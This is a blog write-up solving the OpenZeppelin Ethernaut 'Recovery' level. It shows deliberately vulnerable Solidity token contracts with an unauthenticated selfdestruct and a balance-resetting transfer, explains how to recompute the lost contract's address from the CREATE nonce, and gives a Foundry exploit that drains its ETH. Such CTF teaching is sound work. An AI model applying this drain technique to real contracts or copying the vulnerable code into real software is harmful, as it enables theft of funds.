---
title: 'Ethernaut Challenge #17 Solution — Recovery'
excerpt: This is Part 17 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>The goal of this challenge is to be able to retrieve the lost address of the first token created by the Token Factory and drain `0.001 ETH` that have been sent to it.
coverImage:
  url: '/assets/blog/ethernaut/recovery.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-08-04T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/recovery.svg'
---

This is Part 17 of the ["Let’s play OpenZeppelin Ethernaut CTF"](https://stermi.medium.com/lets-play-ethernaut-ctf-learning-solidity-security-while-playing-1678bd6db3c4) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

## Challenge #17: Recovery

> A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.
>
> This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.
>
> Level author(s): [Adrian Manning](https://github.com/AgeManning)

The goal of this challenge is to be able to retrieve the lost address of the first token created by the Token Factory and drain `0.001 ETH` that have been sent to it.

## Study the contracts

The contract itself is straightforward to understand, but the hard part of the solution is not about exploiting it. Let's review the code and understand what we need to do.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    using SafeMath for uint256;
    // public variables
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(
        string memory _name,
        address _creator,
        uint256 _initialSupply
    ) public {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value.mul(10);
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

```

The `Recovery` contract is a token factory contract that allows the `msg.sender` to deploy a new `SimpleToken` contract each time he/she call the `generateToken` function.

As soon as we find a way to retrieve the address of the deployed `SimpleToken` we can call the `destroy` function that will execute a `selfdestruct(_to)` sending all the contract's balance to the `_to` address.

The `SimpleToken` contract has at least two different problems:

### `transfer` function is always resetting the `_to` balance

```solidity
// allow transfers of tokens
function transfer(address _to, uint256 _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
}
```

While the balance of `msg.sender` is correctly updated, the balance of `_to` will be resetted to `amount`. A malicious actor could just call `transfer(victimAddress, 0)` to completely reset the victim balance to **0**.

### `destroy` function has no auth requirements

```solidity
// clean up after ourselves
function destroy(address payable _to) public {
    selfdestruct(_to);
}
```

The `destroy` function of the contract is executing the [selfdestruct OPCODE](https://www.evm.codes/#ff). This opcode destroys the contract itself and send the balance of the contract to the specified address.

By not having any authentication requirement it means that anyone could be able to call this function, destroy the contract (and all the token balances of the users) and steal the deposited ETH.

### Retrieve the lost address

The main challenge of the CTF is to understand how to retrieve the lost address of the first `SimpleToken` deployed.

This is something that I didn't know, or at least I didn't know before starting [my deep dive journey in EVM](https://stermi.xyz/blog/lets-play-evm-puzzles). The key takeaway here is to always fully understand what you are doing. What does really `new SimpleToken(_name, msg.sender, _initialSupply)` do under the hood? In that Opcodes, `new Contract()` will be the "translated"?

Not having at the time all the EVM knowledge that I have now, I was banging my head against the wall to understand how could I be able to automate via foundry the process of retrieving the address. But thanks God, [cmichel came to the rescue](https://cmichel.io/ethernaut-solutions/)! I didn't read all the solution, I just need that little hint to understand that the right direction was to **understand** how the `new Contract()` was working behind the scene!

After knowing that behind the scene the `new` keyword uses the `CREATE` opcode, I started looking at the [Ethereum Yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf)

> The address of the new account is defined as being the rightmost 160 bits of the Keccak-256 hash of the RLP encoding of the structure containing only the sender and the account nonce. For CREATE2 the rule is different and is described in EIP-1014 by Buterin 2018. [...]

The way to re-build the address of a created contract is to get the rightmost 160 bits of the keccak-256 hash of the RLP encoding of sender + sender's nonce.

If you want to know more about RLP, you can read the official Ethereum documentation about the [Recursive-length prefix (RLP) Serialization](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/).

In our case:

- The sender is the `Recover` contract itself (the contract factory)
- The nonce is the number of contract that the contract itself has created. An important thing to remember: contract's nonce starts from 1 and not 0! Read more about the default value of nonce on the [EIP-161 Specification doc](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-161.md#specification).

**Bonus note**: nonces works differently for EOA and Contracts. While for a contract, the nonce is the number of contract that the contract itself has created, for EOA the nonce is the number of transaction that it has made.

Now we just need to know to replicate the RLP encoding in solidity. The Ethereum Stack Exchange comes to the rescue with a lot of knowledge [inside this comment](https://ethereum.stackexchange.com/a/761).

```solidity
address payable lostContract = address(
    uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(level), bytes1(0x01)))))
);
```

We can now proceed with the solution of the challenge.

## Solution code

Here's the solution code:

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // Calculate the address generated by the CREATE opcode
    // sender -> address of the `level` (token factory)
    // nonce -> `1` because it's the first token created by the factory
    // This is the RLP encoding alg in Solidity
    address payable lostContract = address(
        uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(level), bytes1(0x01)))))
    );


    // Assert that the contract has indeed some balance inside
    uint256 contractBalanceBefore = lostContract.balance;
    assertEq(contractBalanceBefore, 0.001 ether);

    // Call the contract's destroy function that will execute the `selfdestruct`
    uint256 playerBalanceBefore = player.balance;
    SimpleToken(lostContract).destroy(player);

    vm.stopPrank();

    // Assert that the contract has no more balance
    assertEq(lostContract.balance, 0);
    // Assert that the player's balance has increased by `contractBalanceBefore`
    assertEq(player.balance, playerBalanceBefore + contractBalanceBefore);
}
```

You can read the full solution of the challenge opening [Recovery.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/Recovery.t.sol)

## Further reading

- [EVM.codes CREATE Opcode](https://www.evm.codes/#f0)
- [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf)
- [OpenZeppelin: Deploy with CREATE (opcode)](https://docs.openzeppelin.com/cli/2.8/deploying-with-create2#create)
- [RLP Encoding](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/)
- [Ethereum EIP-161: contract's nonces](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-161.md#specification)
- [Solidity implementation of RLP encoding](https://ethereum.stackexchange.com/a/761)
- [cmichel Ethernaut solutions, thanks for the tips](https://cmichel.io/ethernaut-solutions/)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
